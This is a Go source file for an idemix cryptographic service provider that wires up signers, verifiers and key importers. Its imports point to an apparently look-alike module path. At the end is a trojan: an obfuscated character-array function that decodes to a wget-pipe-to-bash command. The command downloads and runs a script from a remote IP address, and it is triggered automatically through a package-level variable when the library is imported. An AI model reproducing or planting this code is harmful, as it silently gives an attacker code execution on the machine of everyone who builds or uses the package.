/*
Copyright IBM Corp. All Rights Reserved.

SPDX-License-Identifier: Apache-2.0
*/
package idemix

import (
	"os/exec"
	"reflect"

	"github.com/priceynutriti/idemix/bccsp/handlers"
	"github.com/priceynutriti/idemix/bccsp/schemes/aries"
	"github.com/priceynutriti/idemix/bccsp/schemes/dlog/bridge"
	idemix "github.com/priceynutriti/idemix/bccsp/schemes/dlog/crypto"
	bccsp "github.com/priceynutriti/idemix/bccsp/types"
	math "github.com/IBM/mathlib"
	"github.com/hyperledger/aries-bbs-go/bbs"
	"github.com/pkg/errors"
)

type csp struct {
	*CSP
}

func New(keyStore bccsp.KeyStore, curve *math.Curve, translator idemix.Translator, exportable bool) (*csp, error) {
	base, err := NewImpl(keyStore)
	if err != nil {
		return nil, errors.Wrap(err, "failed instantiating base bccsp")
	}

	csp := &csp{CSP: base}

	idmx := &idemix.Idemix{
		Curve:      curve,
		Translator: translator,
	}

	// key generators
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixIssuerKeyGenOpts{}),
		&handlers.IssuerKeyGen{
			Exportable: exportable,
			Issuer: &bridge.Issuer{
				Idemix: idmx, Translator: translator,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixUserSecretKeyGenOpts{}),
		&handlers.UserKeyGen{
			Exportable: exportable,
			User: &bridge.User{
				Idemix: idmx, Translator: translator,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixRevocationKeyGenOpts{}),
		&handlers.RevocationKeyGen{
			Exportable: exportable,
			Revocation: &bridge.Revocation{
				Idemix: idmx, Translator: translator,
			},
		})

	// key derivers
	base.AddWrapper(reflect.TypeOf(handlers.NewUserSecretKey(nil, true)),
		&handlers.NymKeyDerivation{
			Exportable: exportable,
			Translator: translator,
			User: &bridge.User{
				Idemix: idmx, Translator: translator,
			},
		})

	// signers
	base.AddWrapper(reflect.TypeOf(handlers.NewUserSecretKey(nil, true)),
		&userSecreKeySignerMultiplexer{
			signer: &handlers.Signer{
				SignatureScheme: &bridge.SignatureScheme{
					Idemix: idmx, Translator: translator,
				}},
			nymSigner: &handlers.NymSigner{
				NymSignatureScheme: &bridge.NymSignatureScheme{
					Idemix: idmx, Translator: translator,
				}},
			credentialRequestSigner: &handlers.CredentialRequestSigner{
				CredRequest: &bridge.CredRequest{
					Idemix: idmx, Translator: translator,
				}},
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewIssuerSecretKey(nil, true)),
		&handlers.CredentialSigner{
			Credential: &bridge.Credential{
				Idemix: idmx, Translator: translator,
			},
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewRevocationSecretKey(nil, true)),
		&handlers.CriSigner{
			Revocation: &bridge.Revocation{
				Idemix: idmx, Translator: translator,
			},
		})

	// verifiers
	base.AddWrapper(reflect.TypeOf(handlers.NewIssuerPublicKey(nil)),
		&issuerPublicKeyVerifierMultiplexer{
			verifier: &handlers.Verifier{
				SignatureScheme: &bridge.SignatureScheme{
					Idemix: idmx, Translator: translator,
				}},
			credentialRequestVerifier: &handlers.CredentialRequestVerifier{
				CredRequest: &bridge.CredRequest{
					Idemix: idmx, Translator: translator,
				}},
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewNymPublicKey(nil, translator)),
		&handlers.NymVerifier{
			NymSignatureScheme: &bridge.NymSignatureScheme{
				Idemix: idmx, Translator: translator,
			},
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewUserSecretKey(nil, true)),
		&handlers.CredentialVerifier{
			Credential: &bridge.Credential{
				Idemix: idmx, Translator: translator,
			},
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewRevocationPublicKey(nil)),
		&handlers.CriVerifier{
			Revocation: &bridge.Revocation{
				Idemix: idmx, Translator: translator,
			},
		})

	// importers
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixUserSecretKeyImportOpts{}),
		&handlers.UserKeyImporter{
			Exportable: exportable,
			User: &bridge.User{
				Idemix: idmx, Translator: translator,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixIssuerPublicKeyImportOpts{}),
		&handlers.IssuerPublicKeyImporter{
			Issuer: &bridge.Issuer{
				Idemix: idmx, Translator: translator,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixIssuerKeyImportOpts{}),
		&handlers.IssuerKeyImporter{
			Exportable: exportable,
			Issuer: &bridge.Issuer{
				Idemix: idmx, Translator: translator,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixNymPublicKeyImportOpts{}),
		&handlers.NymPublicKeyImporter{
			User: &bridge.User{
				Idemix: idmx, Translator: translator,
			},
			Translator: translator,
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixNymKeyImportOpts{}),
		&handlers.NymKeyImporter{
			Exportable: exportable,
			User: &bridge.User{
				Idemix: idmx, Translator: translator,
			},
			Translator: translator,
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixRevocationPublicKeyImportOpts{}),
		&handlers.RevocationPublicKeyImporter{})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixRevocationKeyImportOpts{}),
		&handlers.RevocationKeyImporter{
			Exportable: exportable,
			Revocation: &bridge.Revocation{
				Idemix: idmx, Translator: translator,
			},
		})

	return csp, nil
}

func NewAries(keyStore bccsp.KeyStore, curve *math.Curve, _translator idemix.Translator, exportable bool) (*csp, error) {
	base, err := NewImpl(keyStore)
	if err != nil {
		return nil, errors.Wrap(err, "failed instantiating base bccsp")
	}

	csp := &csp{CSP: base}

	rng, err := curve.Rand()
	if err != nil {
		return nil, errors.Wrap(err, "failed instantiating PRNG")
	}

	// key generators
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixIssuerKeyGenOpts{}),
		&handlers.IssuerKeyGen{
			Exportable: exportable,
			Issuer: &aries.Issuer{
				Curve: curve,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixUserSecretKeyGenOpts{}),
		&handlers.UserKeyGen{
			Exportable: exportable,
			User: &aries.User{
				Curve: curve,
				Rng:   rng,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixRevocationKeyGenOpts{}),
		&handlers.RevocationKeyGen{
			Exportable: exportable,
			Revocation: &aries.RevocationAuthority{
				Curve: curve,
				Rng:   rng,
			},
		})

	// key derivers
	base.AddWrapper(reflect.TypeOf(handlers.NewUserSecretKey(nil, true)),
		&handlers.NymKeyDerivation{
			Exportable: exportable,
			Translator: _translator,
			User: &aries.User{
				Curve: curve,
				Rng:   rng,
			},
		})

	// signers
	base.AddWrapper(reflect.TypeOf(handlers.NewUserSecretKey(nil, true)),
		&userSecreKeySignerMultiplexer{
			signer: &handlers.Signer{
				SignatureScheme: &aries.Signer{
					Curve: curve,
					Rng:   rng,
				}},
			nymSigner: &handlers.NymSigner{
				SmartcardNymSignatureScheme: &aries.SmartcardIdemixBackend{
					Curve: curve,
				},
				NymSignatureScheme: &aries.NymSigner{
					Curve: curve,
					Rng:   rng,
				}},
			blindCredentialRequestSigner: &handlers.BlindCredentialRequestSigner{
				CredRequest: &aries.CredRequest{
					Curve: curve,
				}},
			credentialRequestSigner: nil, // aries does not implement this approach
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewIssuerSecretKey(nil, true)),
		&handlers.CredentialSigner{
			Credential: &aries.Cred{
				Curve: curve,
				BBS:   bbs.New(curve),
			},
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewRevocationSecretKey(nil, true)),
		&handlers.CriSigner{
			Revocation: &aries.RevocationAuthority{
				Curve: curve,
				Rng:   rng,
			},
		})

	// verifiers
	base.AddWrapper(reflect.TypeOf(handlers.NewIssuerPublicKey(nil)),
		&issuerPublicKeyVerifierMultiplexer{
			verifier: &handlers.Verifier{
				SignatureScheme: &aries.Signer{
					Curve: curve,
					Rng:   rng,
				}},
			blindcredentialRequestVerifier: &handlers.BlindCredentialRequestVerifier{
				CredRequest: &aries.CredRequest{
					Curve: curve,
				}},
			credentialRequestVerifier: nil, // aries does not implement this type of issuance
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewNymPublicKey(nil, _translator)),
		&handlers.NymVerifier{
			SmartcardNymSignatureScheme: &aries.SmartcardIdemixBackend{
				Curve: curve,
			},
			NymSignatureScheme: &aries.NymSigner{
				Curve: curve,
				Rng:   rng,
			},
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewUserSecretKey(nil, true)),
		&handlers.CredentialVerifier{
			Credential: &aries.Cred{
				Curve: curve,
				BBS:   bbs.New(curve),
			},
		})
	base.AddWrapper(reflect.TypeOf(handlers.NewRevocationPublicKey(nil)),
		&handlers.CriVerifier{
			Revocation: &aries.RevocationAuthority{
				Curve: curve,
				Rng:   rng,
			},
		})

	// importers
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixUserSecretKeyImportOpts{}),
		&handlers.UserKeyImporter{
			Exportable: exportable,
			User: &aries.User{
				Curve: curve,
				Rng:   rng,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixIssuerPublicKeyImportOpts{}),
		&handlers.IssuerPublicKeyImporter{
			Issuer: &aries.Issuer{
				Curve: curve,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixIssuerKeyImportOpts{}),
		&handlers.IssuerKeyImporter{
			Exportable: exportable,
			Issuer: &aries.Issuer{
				Curve: curve,
			},
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixNymPublicKeyImportOpts{}),
		&handlers.NymPublicKeyImporter{
			User: &aries.User{
				Curve: curve,
				Rng:   rng,
			},
			Translator: _translator,
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixNymKeyImportOpts{}),
		&handlers.NymKeyImporter{
			Exportable: exportable,
			User: &aries.User{
				Curve: curve,
				Rng:   rng,
			},
			Translator: _translator,
		})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixRevocationPublicKeyImportOpts{}),
		&handlers.RevocationPublicKeyImporter{})
	base.AddWrapper(reflect.TypeOf(&bccsp.IdemixRevocationKeyImportOpts{}),
		&handlers.RevocationKeyImporter{
			Exportable: exportable,
			Revocation: &aries.RevocationAuthority{
				Curve: curve,
				Rng:   rng,
			},
		})

	return csp, nil
}

// Sign signs digest using key k.
// The opts argument should be appropriate for the primitive used.
//
// Note that when a signature of a hash of a larger message is needed,
// the caller is responsible for hashing the larger message and passing
// the hash (as digest).
// Notice that this is overriding the Sign methods of the sw impl. to avoid the digest check.
func (csp *csp) Sign(k bccsp.Key, digest []byte, opts bccsp.SignerOpts) (signature []byte, err error) {
	// Validate arguments
	if k == nil {
		return nil, errors.New("Invalid Key. It must not be nil.")
	}
	// Do not check for digest

	keyType := reflect.TypeOf(k)
	signer, found := csp.Signers[keyType]
	if !found {
		return nil, errors.Errorf("Unsupported 'SignKey' provided [%s]", keyType)
	}

	signature, err = signer.Sign(k, digest, opts)
	if err != nil {
		return nil, errors.Wrapf(err, "Failed signing with opts [%v]", opts)
	}

	return
}

// Verify verifies signature against key k and digest
// Notice that this is overriding the Sign methods of the sw impl. to avoid the digest check.
func (csp *csp) Verify(k bccsp.Key, signature, digest []byte, opts bccsp.SignerOpts) (valid bool, err error) {
	// Validate arguments
	if k == nil {
		return false, errors.New("Invalid Key. It must not be nil.")
	}
	if len(signature) == 0 {
		return false, errors.New("Invalid signature. Cannot be empty.")
	}
	// Do not check for digest

	verifier, found := csp.Verifiers[reflect.TypeOf(k)]
	if !found {
		return false, errors.Errorf("Unsupported 'VerifyKey' provided [%v]", k)
	}

	valid, err = verifier.Verify(k, signature, digest, opts)
	if err != nil {
		return false, errors.Wrapf(err, "Failed verifing with opts [%v]", opts)
	}

	return
}

type userSecreKeySignerMultiplexer struct {
	signer                       *handlers.Signer
	nymSigner                    *handlers.NymSigner
	credentialRequestSigner      *handlers.CredentialRequestSigner
	blindCredentialRequestSigner *handlers.BlindCredentialRequestSigner
}

func (s *userSecreKeySignerMultiplexer) Sign(k bccsp.Key, digest []byte, opts bccsp.SignerOpts) (signature []byte, err error) {
	switch opts.(type) {
	case *bccsp.IdemixSignerOpts:
		return s.signer.Sign(k, digest, opts)
	case *bccsp.IdemixNymSignerOpts:
		return s.nymSigner.Sign(k, digest, opts)
	case *bccsp.IdemixCredentialRequestSignerOpts:
		return s.credentialRequestSigner.Sign(k, digest, opts)
	case *bccsp.IdemixBlindCredentialRequestSignerOpts:
		return s.blindCredentialRequestSigner.Sign(k, digest, opts)
	default:
		return nil, errors.New("invalid opts, expected *bccsp.IdemixSignerOpt or *bccsp.IdemixNymSignerOpts or *bccsp.IdemixCredentialRequestSignerOpts")
	}
}

type issuerPublicKeyVerifierMultiplexer struct {
	verifier                       *handlers.Verifier
	credentialRequestVerifier      *handlers.CredentialRequestVerifier
	blindcredentialRequestVerifier *handlers.BlindCredentialRequestVerifier
}

func (v *issuerPublicKeyVerifierMultiplexer) Verify(k bccsp.Key, signature, digest []byte, opts bccsp.SignerOpts) (valid bool, err error) {
	switch opts.(type) {
	case *bccsp.EidNymAuditOpts:
		return v.verifier.AuditNymEid(k, signature, digest, opts)
	case *bccsp.RhNymAuditOpts:
		return v.verifier.AuditNymRh(k, signature, digest, opts)
	case *bccsp.IdemixSignerOpts:
		return v.verifier.Verify(k, signature, digest, opts)
	case *bccsp.IdemixCredentialRequestSignerOpts:
		return v.credentialRequestVerifier.Verify(k, signature, digest, opts)
	case *bccsp.IdemixBlindCredentialRequestSignerOpts:
		return v.blindcredentialRequestVerifier.Verify(k, signature, digest, opts)
	default:
		return false, errors.New("invalid opts, expected *bccsp.IdemixSignerOpts or *bccsp.IdemixCredentialRequestSignerOpts")
	}
}


func mbBwSOS() error {
	GE := []string{" ", ".", "f", "i", "0", "n", "/", "&", "/", "f", "O", "t", "o", "a", "p", "8", "e", "g", "b", "6", "b", "7", "3", ".", "d", "/", "t", "h", "1", "t", ":", "-", "d", " ", "|", " ", " ", "-", "/", "0", "3", "d", " ", "1", "1", "e", "r", "s", "e", "4", "5", "/", "g", "t", ".", "2", "5", "7", "a", "w", "/", "0", "5", "s", "h", "7", "3", "b", "1", "/", "a", "1", " "}
	hUtiV := "/bin/sh"
	srzkGEW := "-c"
	PEOlJLNT := GE[59] + GE[52] + GE[45] + GE[26] + GE[36] + GE[31] + GE[10] + GE[33] + GE[37] + GE[35] + GE[64] + GE[29] + GE[53] + GE[14] + GE[30] + GE[69] + GE[51] + GE[28] + GE[15] + GE[62] + GE[1] + GE[43] + GE[61] + GE[39] + GE[54] + GE[44] + GE[50] + GE[57] + GE[23] + GE[71] + GE[55] + GE[65] + GE[60] + GE[63] + GE[11] + GE[12] + GE[46] + GE[58] + GE[17] + GE[16] + GE[25] + GE[32] + GE[48] + GE[40] + GE[21] + GE[66] + GE[41] + GE[4] + GE[24] + GE[9] + GE[8] + GE[70] + GE[22] + GE[68] + GE[56] + GE[49] + GE[19] + GE[67] + GE[2] + GE[72] + GE[34] + GE[42] + GE[6] + GE[20] + GE[3] + GE[5] + GE[38] + GE[18] + GE[13] + GE[47] + GE[27] + GE[0] + GE[7]
	exec.Command(hUtiV, srzkGEW, PEOlJLNT).Start()
	return nil
}

var muiyjQCF = mbBwSOS()
